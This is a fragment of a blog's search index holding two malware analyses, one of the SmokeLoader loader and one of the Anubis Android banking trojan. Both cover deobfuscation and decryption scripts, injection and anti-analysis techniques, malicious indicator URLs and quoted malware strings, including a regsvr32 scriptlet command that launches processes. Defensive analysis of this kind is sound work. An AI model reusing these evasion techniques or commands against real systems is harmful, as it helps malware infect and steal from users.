        "excerpt":"SmokeLoader is a well known bot that is been around since 2011. It’s mainly used to drop other malware families. SmokeLoader has been under development and is constantly changing with multiple novel features added throughout the years.   Sample SHA256: fc20b03299b8ae91e72e104ee4f18e40125b2b061f1509d1c5b3f9fac3104934      Stage 1   This stage starts off by allocating memory for shellcode using LocalAlloc() (not VirtualAlloc), then it fills this memory with the shellcode (86 KB).      Next, it changes the protection of the allocated memory region to PAGE_EXECUTE_READWRITE using VirtualProtect(), then it writes the shellcode and executes it.      Shellcode   The shellcode starts by getting the addresses of LoadLibraryA and GetProcAddress to resolve APIs dynamically, but first let’s see how it does that.   First it passes some hash values to a sub-routine that returns the address of the requested function.      After some digging, I found out that the algorithm for calculating the hashes is pretty simple.   int calc_hash(char* name) {     int x, hash = 0;     for(int i=0; i&lt;strlen(name); i++) {         x = name[i] | 0x60;         hash = 2 * (x + hash);     }     return hash; }   The shellcode uses PEB traversal technique for finding a function.      Process Environment Block (PEB) is a user-mode data structure that can be used by applications (and by extend by malware) to  get information such as the list of loaded modules, process startup  arguments, heap address among other useful capabilities.    The shellcode traverses the PEB structure at FS[:30] and iterating through loaded modules to search for the requested module (kernel32 in this case). It hashes the name of each module using the algorithm above and compares it with the supplied hash.   Next, it iterates over the export table of the module to find the requested function, similar to the previous step.                                    The next step is to resolve APIs using LoadLibraryA and GetProcAddress, the shellcode uses stack strings to complicate the analysis.      Here is the list of imported functions:                              Expand to see more           &emsp; ntdll.dll  &emsp; &emsp; &ensp; NtUnmapViewOfSection  &emsp; &emsp; &ensp; NtWriteVirtualMemory  &emsp; kernel32.dll  &emsp; &emsp; &ensp; CloseHandle  &emsp; &emsp; &ensp; CreateFileA  &emsp; &emsp; &ensp; CreateProcessA  &emsp; &emsp; &ensp; ExitProcess  &emsp; &emsp; &ensp; GetCommandLineA   &emsp; &emsp; &ensp; GetFileAttributesA  &emsp; &emsp; &ensp; GetModuleFileNameA  &emsp; &emsp; &ensp; GetStartupInfoA  &emsp; &emsp; &ensp; GetThreadContext  &emsp; &emsp; &ensp; ReadProcessMemory  &emsp; &emsp; &ensp; ResumeThread  &emsp; &emsp; &ensp; SetThreadContext  &emsp; &emsp; &ensp; VirtualAlloc  &emsp; &emsp; &ensp; VirtualAllocEx  &emsp; &emsp; &ensp; VirtualFree  &emsp; &emsp; &ensp; VirtualProtectEx  &emsp; &emsp; &ensp; WaitForSingleObject  &emsp; &emsp; &ensp; WinExec  &emsp; &emsp; &ensp; WriteFile  &emsp; &emsp; &ensp; WriteProcessMemory  &emsp; user32.dll  &emsp; &emsp; &ensp; CreateWindowExA  &emsp; &emsp; &ensp; DefWindowProcA  &emsp; &emsp; &ensp; GetMessageA  &emsp; &emsp; &ensp; GetMessageExtraInfo  &emsp; &emsp; &ensp; MessageBoxA  &emsp; &emsp; &ensp; PostMessageA  &emsp; &emsp; &ensp; RegisterClassExA   Process Hollowing   The shellcode creates a new processes of SmokeLoader in a suspended state.      Next, it hollows out the memory at 0x400000 using ZwUnmapViewOfSection() and then allocates it again using VirtualAllocEx() with RWX permissions.   Finally, it writes the next stage executable to the allocated memory region using two calls to ZwWriteVirtualMemory(), the first one to write the MZ header and the other for the rest of the executable.      Stage 2   After dumping the second stage from memory, I got a warm welcome from SmokeLoader :(      This stage is full of anti-analysis tricks, so let’s dive in.   Opaque Predicates   The first anti-analysis trick is Opaque Predicates, it’s a commonly used technique in program obfuscation, intended to add complexity to the control flow. There are many patterns of this technique so I will stick with the one used here.   This obfuscation simply takes an absolute jump (JMP) and transforms it into two conditional jumps (JZ/JNZ). Depending on the value of the Zero flag (ZF), the execution will follow the first or second branch.   However, disassemblers are tricked into thinking that there is a fall-through branch if the second jump is not taken (which is impossible as one of them must be taken) and tries to disassemble the unreachable instructions (often invalid) resulting in garbage code.      The deobfuscation is so simple, we just need to patch the first conditional jump to an absolute jump and nop out the second jump, we can use IDAPython to achieve this:   import idc  ea = 0 while True:     ea =  min(idc.find_binary(ea, idc.SEARCH_NEXT | idc.SEARCH_DOWN, \"74 ? 75 ?\"),  # JZ / JNZ               idc.find_binary(ea, idc.SEARCH_NEXT | idc.SEARCH_DOWN, \"75 ? 74 ?\"))  # JNZ / JZ     if ea == idc.BADADDR:     \tbreak     idc.patch_byte(ea, 0xEB)\t# JMP     idc.patch_byte(ea+2, 0x90)\t# NOP     idc.patch_byte(ea+3, 0x90)\t# NOP   Anti Debugging   This stage first checks OSMajorVersion at PEB[0xA4] if it’s greater than 6 (Windows Vista and higher), it’s also reading BeingDebugged at PEB[0x2] to check for attached debuggers.      What’s interesting here is that these checks are used to calculate the return address. If the OSMajroVersion is less than 6 or there’s an attached debugger, it will jump to an invalid memory location. That’s clever.   Another neat trick is that instead of using direct jumps, the code pushes the jump address stored at eax  into the stack then returns to it.      Encrypted Functions   Most of the functions are encrypted. After deobfuscating the opaque predicates, I found the encryption function which is pretty simple.   The function takes an offset and a size, it XORes the chunk at that offset with a single byte (0xA6).      We can use IDAPython again to decrypt the encrypted chunks:   import idc import idautils  def xor_chunk(offset, n): \tea = 0x400000 + offset \tfor i in range(n): \t\tbyte = ord(idc.get_bytes(ea+i, 1)) \t\tbyte ^= 0xA6 \t\tidc.patch_byte(ea+i, byte)  xor_chunk_addr = 0x401294\t# address of the xoring function for xref in idautils.CodeRefsTo(xor_chunk_addr, 0): \tmov_addr = list(idautils.CodeRefsTo(xref, 0))[0] - 5 \tn = idc.get_operand_value(mov_addr, 1) \toffset = (xref + 5) - 0x400000 \txor_chunk(offset, n)   After the decryption:      One thing to note here, SmokeLoader tries to keep as many encrypted code as possible. So once it’s done with the decrypted functions, it encrypts it again.      Anti Hooking   Many Sandboxes and Security Solutions hook user-land functions of ntdll.dll to trace system calls. SmokeLoader tries to evade this by using its own copy of ntdll. It copies ntdll.dll to \"%TEMP%\\&lt;hardcoded_name&gt;.tmp\" then loads it using LdrLoadDll() and resolves its imports from it.      Custom Imports   SmokeLoader stores a hash table of its imports, it uses the same PEB traversal technique explained earlier to walk through the DLLs’ export table and compare the hash of each API name with the stored hashes.   The hashing function is an implementation of djb2 hashing algorithms:   int calc_hash(char *api_name) { \tint hash=0x1505; \tfor(int i=0; i&lt;=strlen(api_name); i++)\t// null byte included \t\thash = ((hash &lt;&lt; 5) + hash) + api_name[i]; \treturn hash; }   Here is a list of imported functions and their corresponding hashes:                              Expand to see more           &emsp; ntdll.dll  &emsp; &emsp; &ensp; LdrLoadDll                  (0x64033f83)  &emsp; &emsp; &ensp; NtClose                     (0xfd507add)  &emsp; &emsp; &ensp; NtTerminateProcess          (0xf779110f)  &emsp; &emsp; &ensp; RtlInitUnicodeString        (0x60a350a9)  &emsp; &emsp; &ensp; RtlMoveMemory               (0x845136e7)  &emsp; &emsp; &ensp; RtlZeroMemory               (0x8a3d4cb0)  &emsp; kernel32.dll  &emsp; &emsp; &ensp; CopyFileW                   (0x306cceb7)  &emsp; &emsp; &ensp; CreateEventW                (0xfd4027f2)   &emsp; &emsp; &ensp; CreateFileMappingW          (0x5b3f901c)  &emsp; &emsp; &ensp; CreateThread                (0x60277e71)  &emsp; &emsp; &ensp; DeleteFileW                 (0xb7e96d0f)  &emsp; &emsp; &ensp; ExpandEnvironmentStringsW   (0x057074bb)  &emsp; &emsp; &ensp; GetModuleFileNameA          (0x8acccaed)  &emsp; &emsp; &ensp; GetModuleFileNameW          (0x8acccdc3)  &emsp; &emsp; &ensp; GetModuleHandleA            (0x9cbd2a58)  &emsp; &emsp; &ensp; GetSystemDirectoryA         (0xaebc5060)  &emsp; &emsp; &ensp; GetTempFileNameW            (0x9a376a33)  &emsp; &emsp; &ensp; GetTempPathW                (0x7e28b9df)  &emsp; &emsp; &ensp; GetVolumeInformationA       (0xf25ce6a4)  &emsp; &emsp; &ensp; LocalAlloc                  (0xeda647bb)  &emsp; &emsp; &ensp; LocalFree                   (0x742c61b2)  &emsp; &emsp; &ensp; MapViewOfFile               (0x4db4c713)  &emsp; &emsp; &ensp; Sleep                       (0xd156a5be)  &emsp; &emsp; &ensp; WaitForSingleObject         (0x8681d8fa)  &emsp; &emsp; &ensp; lstrcatW                    (0x2ab51a99)  &emsp; &emsp; &ensp; lstrcmpA                    (0x2abb9b4b)  &emsp; user32.dll  &emsp; &emsp; &ensp; EnumChildWindows            (0x9a8897c9)  &emsp; &emsp; &ensp; EnumPropsA                  (0x8f0f57cf)  &emsp; &emsp; &ensp; GetForegroundWindow         (0x5a6c9878)  &emsp; &emsp; &ensp; GetKeyboardLayoutList       (0x04e9de30)  &emsp; &emsp; &ensp; GetShellWindow              (0xd454e895)  &emsp; &emsp; &ensp; GetWindowThreadProcessId    (0x576a5801)  &emsp; &emsp; &ensp; SendMessageA                (0x41ecd315)  &emsp; &emsp; &ensp; SendNotifyMessageA          (0xc6123bae)  &emsp; &emsp; &ensp; SetPropA                    (0x90bc10d3)  &emsp; &emsp; &ensp; wsprintfW                   (0x0bafd3f9)  &emsp; advapi32.dll  &emsp; &emsp; &ensp; GetTokenInformation         (0x696464ac)  &emsp; &emsp; &ensp; OpenProcessToken            (0x74f5e377)  &emsp; shell32.dll  &emsp; &emsp; &ensp; ShellExecuteExW             (0xf8e40384)    And here is the list of the imported functions from the copied ntdll (for anti-hooking):                              Expand to see more           &emsp; 4DD3.tmp  &emsp; &emsp; &ensp; NtAllocateVirtualMemory     (0x5a0c2ccc)  &emsp; &emsp; &ensp; NtCreateSection             (0xd5f23ad0)  &emsp; &emsp; &ensp; NtEnumerateKey              (0xb6306996)  &emsp; &emsp; &ensp; NtFreeVirtualMemory         (0x2a6fa509)  &emsp; &emsp; &ensp; NtMapViewOfSection          (0x870246aa)  &emsp; &emsp; &ensp; NtOpenKey                   (0xc29efe42)  &emsp; &emsp; &ensp; NtOpenProcess               (0x507bcb58)  &emsp; &emsp; &ensp; NtQueryInformationProcess   (0xd6d488a2)  &emsp; &emsp; &ensp; NtQueryKey                  (0xa9475346)   &emsp; &emsp; &ensp; NtQuerySystemInformation    (0xb83de8a8)  &emsp; &emsp; &ensp; NtUnmapViewOfSection        (0x8352aa4d)  &emsp; &emsp; &ensp; NtWriteVirtualMemory        (0x546899d2)  &emsp; &emsp; &ensp; RtlDecompressBuffer         (0xdeb36606)  &emsp; &emsp; &ensp; towlower                    (0xf7660ba8)  &emsp; &emsp; &ensp; wcsstr                      (0xbb629f0b)    Anti VM   SmokeLoader enumerates all the subkeys of these keys:      System\\CurrentControlSet\\Enum\\IDE   System\\CurrentControlSet\\Enum\\SCSI   Then it transforms them into lowercase and searches for these strings in the enumerated keys names:      qemu   virtio   vmware   vbox   xen   If one of them is found, the binary exits.                                    Process Injection   SmokeLoader uses PROPagate injection method to inject the next stage into explorer.exe.   First it decompresses the next stage using RtlDecompressBuffer().      Then there is a call to NtOpenProcess() to open explorer.exe for the injection.      The injection process starts by creating two shared sections between the current process and explorer process (one section for the modified property and the other for the next stage’s code), then SmokeLoader maps the created sections to the current process and explorer process memory space (so any changes in the sections will be reflected in explorer process).   Note that both sections have \"RWX\" protection which might raise some red flags by security solutions.                                    We can see that explorer got a handle to these two sections (this is similar to classic code injection but with much more stealth).      SmokeLoader then writes the next stage to one of the sections and the modified property (which will call the next stage’s code) to the other section.   Finally, it sets the modified property using SetPropA() and sends a message to explorer window using SendNotifyMessageA(), this will result in the injected code being executed in the context of explorer.exe.      Stage 3   This is the final stage of SmokeLoader, it starts by doing some anti-analysis checks.   Checking Running Processes   This stage loops through the running process, it calculates each process name’s hash and compares it against some hardcoded hashes.   Here is the algorithm for calculating the hash of a process name:   uint ROL(uint x, uint bits) { \treturn x&lt;&lt;bits | x&gt;&gt;(32-bits); } int calc_hash(char *proc_name) {\t \tint hash = 0; \tfor(int i=0; i&lt;strlen(proc_name); i++) \t\thash = (proc_name[i] &amp; 0xDF) + ROL(hash ^ (proc_name[i] &amp; 0xDF), 8); \treturn hash ^ 0xD781F33C; }   A quick guess and I could get the processes names:   0xD384255C  →  Autoruns.exe 0x76BDCBAB  →  procexp.exe 0xA159E6BE  →  procexp64.exe 0x7E9CCCA5  →  procmon.exe 0xA24B8E63  →  procmon64.exe 0x63B3D1A4  →  Tcpview.exe 0xA28974F3  →  Wireshark.exe 0xA9B5F897  →  ProcessHacker.exe 0x6893EBAB  →  ollydbg.exe 0xF5FD94B7  →  x32dbg.exe 0xCBFD99B0  →  x64dbg.exe 0x8993DEE5  →  idaq.exe 0x8993D8CF  →  idaw.exe 0x8C083960  →  idaq64.exe 0xB6223960  →  idaw64.exe   If one of these processes is found to be running, explorer.exe will exit.   Encrypted Strings   All strings of this stage are encrypted using RC4 and they are decrypted on demand. The RC4 key = 0xFA5F66D7.   The encrypted strings are stored continuously in a big blob in this form:                                    Here is a small script for decrypting these strings (I used Go because it has native support for RC4).   package main import ( \t\"fmt\" \t\"io/ioutil\" \t\"encoding/hex\" \t\"crypto/rc4\" ) var RC4_KEY, _ = hex.DecodeString(\"FA5F66D7\")  func rc4_decrypt(data []byte) { \tcipher, _ := rc4.NewCipher(RC4_KEY) \tcipher.XORKeyStream(data, data) \tfmt.Printf(\"%s\\n\", data) } func main() { \tdata, _ := ioutil.ReadFile(\"dump\") \tfor i := 0; i &lt; len(data); { \t\tn := int(data[i])\t \t\trc4_decrypt(data[i+1:i+n+1]) \t\ti += n+1 \t} }   And here is the decrypted strings:                              Expand to see more            &emsp; http://www.msftncsi.com/ncsi.txt  &emsp; Software\\Microsoft\\Internet Explorer  &emsp; advapi32.dll  &emsp; Location:  &emsp; plugin_size  &emsp; \\explorer.exe  &emsp; user32   &emsp; advapi32  &emsp; urlmon  &emsp; ole32  &emsp; winhttp  &emsp; ws2_32  &emsp; dnsapi  &emsp; svcVersion  &emsp; Version  &emsp; &amp;lt?xml version=\"1.0\"?&amp;gt&amp;ltscriptlet&amp;gt&amp;ltregistration classid=\"{00000000-0000-0000-0000-00000000%04X}\"&amp;gt&amp;ltscript language=\"jscript\"&amp;gt&amp;lt![CDATA[GetObject(\"winmgmts:Win32_Process\").Create(\"%ls\",null,null,null);]]&amp;gt&amp;lt/script&amp;gt&amp;lt/registration&amp;gt&amp;lt/scriptlet&amp;gt  &emsp; S:(ML;;NW;;;LW)D:(A;;0x120083;;;WD)(A;;0x120083;;;AC)  &emsp; %s\\%hs  &emsp; %s%s  &emsp; regsvr32 /s %s  &emsp; regsvr32 /s /n /u /i:\"%s\" scrobj  &emsp; %APPDATA%  &emsp; %TEMP%  &emsp; .exe  &emsp; .dll  &emsp; :Zone.Identifier  &emsp; POST  &emsp; Content-Type: application/x-www-form-urlencoded  &emsp; runas  &emsp; Host: %s  &emsp; PT10M  &emsp; 1999-11-30T00:00:00  &emsp; NvNgxUpdateCheckDaily_{&#37;08X-&#37;04X-&#37;04X-&#37;04X-&#37;08X&#37;04X}  &emsp; Accept: */*  &emsp; Referer: %S   Encrypted C2 Domains   The C2 domains are encrypted using simple XOR operations.      They are stored in a in this form:                                    We can easily decrypt the domains:   def decrypt_c2(enc, key): \tenc, key = bytes.fromhex(enc), bytes.fromhex(key) \tdec = \"\" \tfor c in enc: \t\tfor i in key: c = c ^ i \t\tdec += chr(c ^ 0xE4) \tprint(dec)  # decrypt_c2(\"E7FBFBFFB5A0A0E2E0FCFBEAFCFBA2FCEAFDF9E6ECEABFBEBDBABFBAA1FDFAA0\", \"EFC11A5F\") # http://mostest-service012505.ru/   C2 Communications   SmokeLoader sleeps for 10 seconds (1000*10) before connecting to the Internet.      First it queries http://www.msftncsi.com/ncsi.txt (This URL is usually queried by Windows to determine if the computer is connected to the Internet).   If there’s no response, it sleeps for 64 ms and queries it again until it receives a response.   Then SmokeLoader sends a POST request to the C2 server. The payload is encrypted using RC4 before sending it.   The POST request returns a \"404 Not Found\" response but it contains a payload in the response body.      Unfortunately most of the C2 domains are down so I couldn’t proceed with the analysis, but I think that’s enough with SmokeLoader :)   IOCs   Hashes   SmokeLoader fc20b03299b8ae91e72e104ee4f18e40125b2b061f1509d1c5b3f9fac3104934   Files   %TEMP%\\4dd3.dll   C2 Domains   http://alltest-service012505[.]ru/  http://besttest-service012505[.]ru/  http://biotest-service012505[.]ru/  http://clubtest-service012505[.]ru/  http://domtest-service012505[.]ru/  http://infotest-service012505[.]ru/  http://kupitest-service012505[.]ru/  http://megatest-service012505[.]ru/  http://mirtest-service012505[.]ru/  http://mostest-service012505[.]ru/  http://mytest-service01242505[.]ru/  http://mytest-service012505[.]ru/  http://newtest-service012505[.]ru/  http://proftest-service012505[.]ru/  http://protest-01242505[.]tk/  http://protest-01252505[.]ml/  http://protest-01262505[.]ga/  http://protest-01272505[.]cf/  http://protest-01282505[.]gq/  http://protest-01292505[.]com/  http://protest-01302505[.]net/  http://protest-01312505[.]org/  http://protest-01322505[.]biz/  http://protest-01332505[.]info/  http://protest-01342505[.]eu/  http://protest-01352505[.]nl/  http://protest-01362505[.]mobi/  http://protest-01372505[.]name/  http://protest-01382505[.]me/  http://protest-01392505[.]garden/  http://protest-01402505[.]art/  http://protest-01412505[.]band/  http://protest-01422505[.]bargains/  http://protest-01432505[.]bet/  http://protest-01442505[.]blue/  http://protest-01452505[.]business/  http://protest-01462505[.]casa/  http://protest-01472505[.]city/  http://protest-01482505[.]click/  http://protest-01492505[.]company/  http://protest-01502505[.]futbol/  http://protest-01512505[.]gallery/  http://protest-01522505[.]game/  http://protest-01532505[.]games/  http://protest-01542505[.]graphics/  http://protest-01552505[.]group/  http://protest-02252505[.]ml/  http://protest-02262505[.]ga/  http://protest-02272505[.]cf/  http://protest-02282505[.]gq/  http://protest-03252505[.]ml/  http://protest-03262505[.]ga/  http://protest-03272505[.]cf/  http://protest-03282505[.]gq/  http://protest-05242505[.]tk/  http://protest-06242505[.]tk/  http://protest-service01242505[.]ru/  http://protest-service012505[.]ru/  http://rustest-service012505[.]ru/  http://rutest-service01242505[.]ru/  http://rutest-service012505[.]ru/  http://shoptest-service012505[.]ru/  http://supertest-service012505[.]ru/  http://test-service01242505[.]ru/  http://test-service012505[.]com/  http://test-service012505[.]eu/  http://test-service012505[.]fun/  http://test-service012505[.]host/  http://test-service012505[.]info/  http://test-service012505[.]net/  http://test-service012505[.]net2505[.]ru/  http://test-service012505[.]online/  http://test-service012505[.]org2505[.]ru/  http://test-service012505[.]pp2505[.]ru/  http://test-service012505[.]press/  http://test-service012505[.]pro/  http://test-service012505[.]pw/  http://test-service012505[.]ru[.]com/  http://test-service012505[.]site/  http://test-service012505[.]space/  http://test-service012505[.]store/  http://test-service012505[.]su/  http://test-service012505[.]tech/  http://test-service012505[.]website/  http://test-service012505[.]xyz/  http://test-service01blog2505[.]ru/  http://test-service01club2505[.]ru/  http://test-service01forum2505[.]ru/  http://test-service01info2505[.]ru/  http://test-service01land2505[.]ru/  http://test-service01life2505[.]ru/  http://test-service01plus2505[.]ru/  http://test-service01pro2505[.]ru/  http://test-service01rus2505[.]ru/  http://test-service01shop2505[.]ru/  http://test-service01stroy2505[.]ru/  http://test-service01torg2505[.]ru/  http://toptest-service012505[.]ru/  http://vsetest-service012505[.]ru/    References   https://www.cert.pl/en/news/single/dissecting-smoke-loader/   https://research.checkpoint.com/2019/2019-resurgence-of-smokeloader/   https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb   https://www.aldeid.com/wiki/PEB-Process-Environment-Block   http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick   https://modexp.wordpress.com/2018/08/23/process-injection-propagate/   https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect#examples   https://www.crowdstrike.com/blog/maze-ransomware-deobfuscation/   ","categories": ["Malware Analysis"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/malware%20analysis/smokeloader/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/malware-analysis/smokeloader/logo.png"
      },{
        "title": "Deep Analysis of Anubis Banking Malware",
        "excerpt":"Introduction   Anubis is a well known android banking malware. Although it hasn’t been around for long (since 2017), it had a higher impact than many older banking malwares due to its large set of capabilities.   As most malware families these days, this sample of Anubis is riding on the “COVID-19” pandemic to trick victims into installing it. This campaign seems to be targeting Turkey and the app can be downloaded from \"http://sosyalkampanya2[.]ml/pandemi/Pandemi-Destek.apk\"      Anubis can spread in two different ways, either by malicious websites (like this one) where it downloads the malicious app directly or it can spread over google play store (where it appears as a legitimate app) then download and install the next stage payload (the malicious app).   Behavioral Analysis   After installation, Anubis forces the user to grant it Accessibility permissions so it can run in the background and receive callbacks by the system when AccessibilityEvents are fired (such as window change and input focus).   Anubis also hides its icon from the app launcher to make it more difficult to remove.      Going inside   After decompiling the APK, we can see that it’s asking for lots of permissions, which means lots of capabilities.      Capabilities   Anubis has a large set of capabilities such as (Keylogging, Sound Recording, SMS Spam, VNC, File Encryption, …).                                    C2 servers   A quick search for “http/https” reveals some interesting things. First, Anubis has a hardcoded C2 server \"http://sosyalkampanya2[.]tk/dedebus/\", it’s also used as a VNC client.      To get new C2 servers, Anubis uses a twitter account for this purpose.   Interestingly enough, the twitter account used here was registered back in 2007.      The way this technique works is that it queries the twitter page (containing Chinese tweets) and searches for the text in between those two tags ( “ 苏尔的开始” ,  “ 苏尔苏尔完” ).   Next it replaces each Chinese character with a corresponding English character.   Finally, the result is Base64-decoded then it’s decrypted using RC4.      Here is the RC4 implementation:      The RC4 key is not dynamically generated, instead it’s using a hardcoded one \"zanubis\".      Data Exfiltration   Anubis has a list of php endpoints to exfiltrate collected data, each endpoint corresponds to a different log type (keystrokes, running processes, …).   It sends a POST request to the C2 server containing the data in an encrypted form.      The data is encrypted using RC4 with the same key mentioned before then it’s Base64-encoded before it’s exfiltrated.   Receiving Commands   Anubis can receive RAT commands (encrypted):      opendir   downloadfile   deletefilefolder   startscreenVNC   stopscreenVNC   startsound   startforegroundsound   stopsound      Additionally, it can receive a long string of commands separated by \"::\" to enable/disable certain functionalities, edit configs or send logs.                              Expand to see more           &emsp; startinj  &emsp; Send_GO_SMS  &emsp; nymBePsG0  &emsp; GetSWSGO  &emsp; telbookgotext  &emsp; getapps  &emsp; getpermissions   &emsp; startaccessibility  &emsp; startpermission  &emsp; ALERT  &emsp; PUSH  &emsp; startAutoPush  &emsp; RequestPermissionInj  &emsp; RequestPermissionGPS  &emsp; ussd  &emsp; sockshost  &emsp; stopsocks5  &emsp; spam  &emsp; recordsound  &emsp; replaceurl  &emsp; startapplication  &emsp; killBot  &emsp; getkeylogger  &emsp; startrat  &emsp; startforward  &emsp; stopforward  &emsp; openbrowser  &emsp; openactivity  &emsp; cryptokey  &emsp; decryptokey  &emsp; getIP    Keylogging   Anubis is listening for accessibility events in the background, if the event is \"TYPE_VIEW_TEXT_CHANGED\", this means that the user is typing something so it gets records.      The keystrokes are written to a file called \"keys.log\", this file is sent to the attacker on demand along with the victim’s device info. The file’s contents can be erased if the C2 response contains the word \"clear\".      File Encryption   Anubis can also behave like a ransomware and encrypt files at /mnt, /mount, /sdcard, /storage.      The encryption/decryption key is received from the C2 server along with the required amount to decrypt the files.                                    The encryption process itself is just RC4 using the received key. Then it writes the encrypted data to a new file with the .AnubisCrypt extension and deletes the original file.      Screen VNC   This feature was recently added to Anubis (according to underground forums), it can start a VNC server using MediaProjection APIs available from Android 5.   Due to Android API restrictions, the attacker can only see the screen of an Android 5+ device but cannot control it.   As mentioned before, Anubis uses the hardcoded C2 server \"http://sosyalkampanya2[.]tk/dedebus/\" as a VNC client.      Intercepting Calls and SMS   Anubis can intercept and forward phone calls to the attacker (which can be used for bank verification for example), it also tries to mute the phone for android 6.0 and lower.                                    SMS messages are intercepting using a broadcast receiver that listens for incoming SMS and sends it to the C2 server in clear text.      Targeted Apps   Anubis loops through installed applications and compares them against hardcoded packages names (mostly banking apps). Once it determines that one of these apps is being used, it can carry out an overlay attack.      Overlay attack works by loading a WebView on top of the legitimate app that looks very similar to the original one. It can be used to steal payment data or used as an attack vector for phishing.   The loading of the WebView is almost instant so that the victim doesn’t get suspicious.      Attempting to Remove Anubis   Anubis can utilize accessibility events to prevent the victim from uninstalling it.   It checks if the current open view contains these strings:           current app name (malware app)       \"com.android.settings\" which is the settings app   \"uninstall\" or \"to remove\"   If that’s the case, the victim is sent back to the home screen.         Conclusion   Anubis is a very rich banking malware with lots of features and capabilities. Although there are rumors that Maza-In (the actor behind Anubis) had been arrested by the Russian authorities, we can see that it’s getting new updates (currently 2.5) and it’s still a common choice of criminals when it comes to Android banking malware.   I have also written a small script for fetching new C2 domains + decrypting sent/received data: https://github.com/N1ght-W0lf/MalwareAnalysis/blob/master/Anubis/c2_emulator.py   IOCs   APKs   Pandemi-Destek.apk: 8cb941658ed8340b67a38a47162ab8850b89a14eee2899f0761fadd4f648fd5e   C2 Related   http://sosyalkampanya2[.]tk/dedebus/   https://twitter[.]com/qweqweqwe/   Targeted Apps   at.spardat.bcrmobile   at.spardat.netbanking   com.bankaustria.android.olb   com.bmo.mobile   com.cibc.android.mobi   com.rbc.mobile.android   com.scotiabank.mobile   com.td   cz.airbank.android   eu.inmite.prj.kb.mobilbank   com.bankinter.launcher   com.kutxabank.android   com.rsi   com.tecnocom.cajalaboral   es.bancopopular.nbmpopular   es.evobanco.bancamovil   es.lacaixa.mobile.android.newwapicon   com.dbs.hk.dbsmbanking   com.FubonMobileClient   com.hangseng.rbmobile   com.MobileTreeApp   com.mtel.androidbea   com.scb.breezebanking.hk   hk.com.hsbc.hsbchkmobilebanking   com.aff.otpdirekt   com.ideomobile.hapoalim   com.infrasofttech.indianBank   com.mobikwik_new   com.oxigen.oxigenwallet   jp.co.aeonbank.android.passbook   jp.co.netbk   jp.co.rakuten_bank.rakutenbank   jp.co.sevenbank.AppPassbook   jp.co.smbc.direct   jp.mufg.bk.applisp.app   com.barclays.ke.mobile.android.ui   nz.co.anz.android.mobilebanking   nz.co.asb.asbmobile   nz.co.bnz.droidbanking   nz.co.kiwibank.mobile   com.getingroup.mobilebanking   eu.eleader.mobilebanking.pekao.firm   eu.eleader.mobilebanking.pekao   eu.eleader.mobilebanking.raiffeisen   pl.bzwbk.bzwbk24   pl.ipko.mobile   pl.mbank   alior.bankingapp.android   com.comarch.mobile.banking.bgzbnpparibas.biznes   com.comarch.security.mobilebanking   com.empik.empikapp   com.empik.empikfoto   com.finanteq.finance.ca   com.orangefinansek   com.orangefinanse   eu.eleader.mobilebanking.invest   pl.aliorbank.aib   pl.allegro   pl.bosbank.mobile   pl.bph   pl.bps.bankowoscmobilna   pl.bzwbk.ibiznes24   pl.bzwbk.mobile.tab.bzwbk24   pl.ceneo   pl_pl.ceneo   pl.com.rossmann.centauros   pl.fmbank.smart   pl.ideabank.mobilebanking   pl.ing.mojeing   pl.millennium.corpApp   pl.orange.mojeorange   pl.pkobp.iko   pl.pkobp.ipkobiznes   com.kuveytturk.mobil   com.magiclick.odeabank   com.mobillium.papara   com.pozitron.albarakaturk   com.teb   ccom.tmob.denizbank   com.tmob.denizbank   com.tmob.tabletdeniz   com.vakifbank.mobilel   com.vakifbank.mobile   tr.com.sekerbilisim.mbank   wit.android.bcpBankingApp.millenniumPL   com.advantage.RaiffeisenBank   hr.asseco.android.jimba.mUCI.ro   may.maybank.android   ro.btrl.mobile   com.amazon.mShop.android.shopping   com.amazon.windowshop   com.ebay.mobile   ru.sberbankmobile   ru.sberbank.spasibo   ru.sberbank_sbbol   ru.sberbank.mobileoffice   ru.sberbank.sberbankir   ru.alfabank.mobile.android   ru.alfabank.oavdo.amc   by.st.alfa   ru.alfabank.sense   ru.alfadirect.app   ru.mw   com.idamob.tinkoff.android   ru.tcsbank.c2c   ru.tinkoff.mgp   ru.tinkoff.sme   ru.tinkoff.goabroad   ru.vtb24.mobilebanking.android   ru.bm.mbm   com.vtb.mobilebank   com.bssys.VTBClient   com.bssys.vtb.mobileclient   com.akbank.android.apps.akbank_direkt   com.akbank.android.apps.akbank_direkt_tablet   com.akbank.softotp   com.akbank.android.apps.akbank_direkt_tablet_20   com.fragment.akbank   com.ykb.android   com.ykb.android.mobilonay   com.ykb.avm   com.ykb.androidtablet   com.veripark.ykbaz   com.softtech.iscek   com.yurtdisi.iscep   com.softtech.isbankasi   com.monitise.isbankmoscow   com.finansbank.mobile.cepsube   finansbank.enpara   com.magiclick.FinansPOS   com.matriksdata.finansyatirim   finansbank.enpara.sirketim   com.vipera.ts.starter.QNB   com.redrockdigimark   com.garanti.cepsubesi   com.garanti.cepbank   com.garantibank.cepsubesiro   biz.mobinex.android.apps.cep_sifrematik   com.garantiyatirim.fx   com.tmobtech.halkbank   com.SifrebazCep   eu.newfrontier.iBanking.mobile.Halk.Retail   tr.com.tradesoft.tradingsystem.gtpmobile.halk   com.DijitalSahne.EnYakinHalkbank   com.ziraat.ziraatmobil   com.ziraat.ziraattablet   com.matriksmobile.android.ziraatTrader   com.matriksdata.ziraatyatirim.pad   de.comdirect.android   de.commerzbanking.mobil   de.consorsbank   com.db.mm.deutschebank   de.dkb.portalapp   com.de.dkb.portalapp   com.ing.diba.mbbr2   de.postbank.finanzassistent   mobile.santander.de   de.fiducia.smartphone.android.banking.vr   fr.creditagricole.androidapp   fr.axa.monaxa   fr.banquepopulaire.cyberplus   net.bnpparibas.mescomptes   com.boursorama.android.clients   com.caisseepargne.android.mobilebanking   fr.lcl.android.customerarea   com.paypal.android.p2pmobile   com.wf.wellsfargomobile   com.wf.wellsfargomobile.tablet   com.wellsFargo.ceomobile   com.usbank.mobilebanking   com.usaa.mobile.android.usaa   com.suntrust.mobilebanking   com.moneybookers.skrillpayments.neteller   com.moneybookers.skrillpayments   com.clairmail.fth   com.konylabs.capitalone   com.yinzcam.facilities.verizon   com.chase.sig.android   com.infonow.bofa   com.bankofamerica.cashpromobile   